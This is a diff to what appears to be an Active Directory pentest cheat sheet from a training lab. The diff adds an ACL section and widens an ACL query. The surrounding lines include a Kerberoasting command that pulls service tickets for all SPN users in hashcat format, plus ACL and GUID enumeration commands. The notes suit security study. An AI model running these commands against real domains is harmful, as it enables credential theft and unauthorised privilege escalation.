@@ -67,8 +67,13 @@ Test-AdminAccess -ComputerName <computername>
 3. Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
 # Request all users and export tickets to a file in hashcat format
 
+```
+
+# Access Control Lists
+```powershell
+
 $sid = Convert-NameToSid <user> # Get SID from username
-Get-DomainObjectACL -Identity <identity of interest or wildcard> | ? {$_.SecurityIdentifier -eq <sid> } # Get ACL of user via sid
+Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq <sid> } # Get ACL of user via sid
 
 $guid= <GUID> 
 Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl # Get object from GUID
